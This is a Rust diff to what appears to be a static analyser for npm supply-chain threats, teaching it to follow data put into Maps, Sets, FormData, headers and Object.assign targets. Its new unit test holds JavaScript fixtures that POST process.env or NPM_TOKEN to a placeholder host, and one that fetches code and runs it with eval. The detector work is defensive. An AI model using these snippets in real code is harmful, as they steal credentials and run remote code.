@@ -385,7 +385,11 @@ pub const RUN_CODE: u8 = 5;
 pub const LOAD_NAME: u8 = 6;
 pub const DESERIALIZE: u8 = 7;
 
-/// A received-code category's name (`_DL_CATEGORY_REASON`'s keys).
+/// A container's methods that put what they are given into it (a splice, its items from the third argument on).
+const COLLECTS: &[&str] = &["push", "unshift", "splice", "set", "add", "append", "fill"];
+/// The calls that put what they are given (after the first argument) into their first argument.
+const PUTS_INTO_FIRST: &[&str] =
+    &["Object.assign", "Object.defineProperty", "Object.defineProperties", "Reflect.set", "Reflect.defineProperty"];
 /// The calls that decode what they are given (the text rule's
 /// `_DECODE_CALL_RE`, read by name).
 const DECODERS: &[&str] = &[
@@ -393,6 +397,7 @@ const DECODERS: &[&str] = &[
     "zlib.gunzipSync", "zlib.unzipSync", "zlib.brotliDecompressSync",
 ];
 
+/// A received-code category's name (`_DL_CATEGORY_REASON`'s keys).
 pub fn received_cat(cat: u8) -> Option<&'static str> {
     match cat {
         RUN_CODE => Some("run"),
@@ -2825,16 +2830,24 @@ impl<'p> Eval<'p> {
         if !server {
             v = v.union(&got);
         }
-        // a container a value is put into holds it
-        if member && (named("push") || named("unshift")) {
-            let obj = self.a().at(callee, jt::A);
-            if self.a().kind(obj) == Kind::Identifier {
-                if let Some(b) = self.bind(obj, scope) {
-                    if self.p.binds[b as usize].kind != BindKind::Import {
-                        let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
-                        self.write(b, union_all(&plains), false);
-                    }
-                }
+        // a container a value is put into holds it: an array's push, unshift and a splice's items, a Map's, a
+        // Headers' or a URLSearchParams' set, a Set's add, a FormData's, a URLSearchParams' or a Headers' append, a
+        // fill; and the target of `Object.assign(target, …)`, `Object.defineProperty`, `Reflect.set`. (D-3: the tree
+        // knew an array's push and unshift alone, so `fd.append('e', env)` sent nothing.) A container a name holds:
+        // a member's (`o.list.push(x)`, `this.items.push(x)`) is not followed, as before, since put into the object
+        // that holds it, it joined unrelated flows in large bundles (vite's, monaco-editor's loader: two of the
+        // popular set's releases SUSPICIOUS when it was)
+        if member && name.as_deref().is_some_and(|n| is_one(n, COLLECTS)) {
+            let from = if named("splice") { 2 } else { 0 };
+            let plains: Vec<V> = args.iter().skip(from).map(|a| a.plain()).collect();
+            let obj = self.a().unwrap(self.a().at(callee, jt::A));
+            self.sc_put_into(obj, union_all(&plains), scope);
+        }
+        if names.iter().any(|n| is_one(n, PUTS_INTO_FIRST)) {
+            if let Some(&target) = self.a().list(node, jt::B).first() {
+                let plains: Vec<V> = args.iter().skip(1).map(|a| a.plain()).collect();
+                let target = self.a().unwrap(target);
+                self.sc_put_into(target, union_all(&plains), scope);
             }
         }
         // a decoder: what it returns is data the script decodes (`atob(x)`,
@@ -2869,6 +2882,18 @@ impl<'p> Eval<'p> {
             }
         }
         Ok(v)
+    }
+
+    /// supply mode: `v` put into `obj` (a container's receiver, an `Object.assign` target) when it is a name: its
+    /// binding holds it (not an import's).
+    fn sc_put_into(&mut self, obj: NodeId, v: V, scope: ScopeId) {
+        if self.a().kind(obj) == Kind::Identifier {
+            if let Some(b) = self.bind(obj, scope) {
+                if self.p.binds[b as usize].kind != BindKind::Import {
+                    self.write(b, v, false);
+                }
+            }
+        }
     }
 
     /// Is the call a decoder: `atob`, zlib's synchronous decompressions, a
@@ -3221,6 +3246,50 @@ mod tests {
         // a function of the os module given as a value
         let src = format!("const os = require('os');\nfunction tryGet(f) {{ return f(); }}\n{}", post("tryGet(os.hostname)"));
         assert_eq!(sent(&src), found("identity", "hostname"));
+    }
+
+    #[test]
+    fn containers_hold_what_they_are_given() {
+        // D-3: the tree knew an array's push and unshift alone; what a Map, a Set or a FormData was given, or
+        // Object.assign put into an object, was sent unseen
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
+        let env = found("environment", "the whole environment");
+        for (fill, body) in [
+            ("const c = [];\nc.push(process.env);\n", "JSON.stringify(c)"),
+            ("const c = [];\nc.unshift(process.env);\n", "JSON.stringify(c)"),
+            ("const c = [];\nc.splice(0, 0, process.env);\n", "JSON.stringify(c)"),
+            ("const c = new Array(1);\nc.fill(process.env);\n", "JSON.stringify(c)"),
+            ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify([...c])"),
+            ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(c.get('e'))"),
+            ("const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"),
+            ("const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"),
+            ("const c = new URLSearchParams();\nc.set('e', JSON.stringify(process.env));\n", "c.toString()"),
+            ("const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"),
+            ("const c = {};\nObject.defineProperty(c, 'e', { value: process.env, enumerable: true });\n", "JSON.stringify(c)"),
+            ("const c = {};\nReflect.set(c, 'e', process.env);\n", "JSON.stringify(c)"),
+        ] {
+            assert_eq!(sent(&format!("{}{}", fill, post(body))), env, "{}", fill);
+        }
+        // a module's container, filled in a function and sent in another
+        let src = format!(
+            "const c = new Map();\nfunction keep() {{ c.set('e', process.env); }}\nkeep();\n{}",
+            post("JSON.stringify([...c])")
+        );
+        assert_eq!(sent(&src), env);
+        // one variable in a header
+        let src = format!(
+            "const h = new Headers();\nh.set('authorization', process.env.NPM_TOKEN);\n\
+             fetch('https://{}/c', {{ method: 'POST', headers: h }});\n",
+            HOST
+        );
+        assert_eq!(sent(&src), found("environment", "NPM_TOKEN"));
+        // what a container holds that nothing sends, and what an import is given, are not sent
+        assert_eq!(sent(&format!("const c = new Map();\nc.set('e', process.env);\n{}", post("'ok'"))), None);
+        assert_eq!(sent(&format!("import c from 'store';\nc.set('e', process.env);\n{}", post("JSON.stringify(c)"))), None);
+        // code received into a Map, then run
+        let src = "const https = require('https');\nhttps.get('https://x.invalid/c', (r) => {\n  const m = new Map();\n  \
+                   let b = '';\n  r.on('data', (d) => { b += d; });\n  r.on('end', () => { m.set('c', b); eval(m.get('c')); });\n});\n";
+        assert_eq!(runs(src), Some("run"));
     }
 
     #[test]
